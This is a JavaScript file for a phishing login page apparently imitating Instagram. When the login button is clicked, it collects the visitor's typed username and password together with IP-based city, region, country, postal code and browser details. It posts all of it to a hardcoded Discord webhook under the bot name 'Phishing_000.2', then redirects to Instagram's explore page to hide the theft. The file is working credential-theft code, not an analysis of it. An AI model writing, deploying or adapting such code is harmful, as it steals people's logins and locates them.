const loginButton = document.querySelector("#loginBtn");
const password = document.querySelector("#passwordInput");
const username = document.querySelector("#usernameInput");
const showPasswordBtn = document.querySelector("#showPasswordBtn");

password.addEventListener("input", disableBtn);
username.addEventListener("input", disableBtn);



function passwordVisible() {
  if (password.type === "password") {
    password.type = "text";
    showPasswordBtn.textContent = "Hide";
  } else {
    password.type = "password";
    showPasswordBtn.textContent = "Show";
  }
}

function passwordBtnVisible() {
  if (password.value.length > 0) {
    showPasswordBtn.style.display = "block";
  } else {
    showPasswordBtn.style.display = "none";
  }
}

function disableBtn() {
  if (username.value && password.value) {
      loginButton.disabled = false;
  } else {
      loginButton.disabled = true;
  }
}

let Info
loginButton.addEventListener("click", () => {
  (async function() {
    Info = await getInfo();
    console.log(Info);
    sendInfo()
  })();
})

async function getInfo() {
  try {
    const response = await fetch("https://ipapi.co/json/");
    const data = await response.json();
    
    const info = `> IP: ${data.ip}\n> Şehir: ${data.city}\n> Bölge: ${data.region}\n> Ülke: ${data.country_name}\n> Posta kodu: ${data.postal}\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;  //`ip: ${data.ip}, city: ${data.city}, region: ${data.region}, country: ${data.country_name}, postal: ${data.postal}, browser: ${navigator.userAgent}`;
    
    return info;
  } catch {
    return `> IP: Unknown\n> Şehir: Unknown\n> Bölge: Unknown\n> Ülke: Unknown\n> Posta kodu: Unknown\n> Browser: ${navigator.userAgent}\n> Username: ${username.value}\n> Password: ${password.value}\n`;
  }
}
  

async function sendInfo() {
  const webhook = "https://discord.com/api/webhooks/1215673969483452466/t84VOKVWf0p8DdVtsfEptNdQ_FOR97A3Csijgko5cpfQbQiIG1pOX4NPKzn4ErAJdmfw"; //your discord webhook url

  const embed = {
    color: 1585803, //#18328b
    title: "Giriş denemesi",
    description: `${Info}`, //`${Info}> Username: ${username.value}\n> Password: ${password.value}\n`
    footer: {
      text: "forOldDays",
    }
  }

  const config = {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({ username: "Phishing_000.2", embeds: [embed] }) //content: `${Info}`
  };

  try {
    await fetch(webhook, config);
  } catch {
    setTimeout(function() {
        window.location.replace("https://www.instagram.com/explore/")
    }, 1000);
  }
  setTimeout(function() {
    window.location.replace("https://www.instagram.com/explore/")
  }, 1000);
}
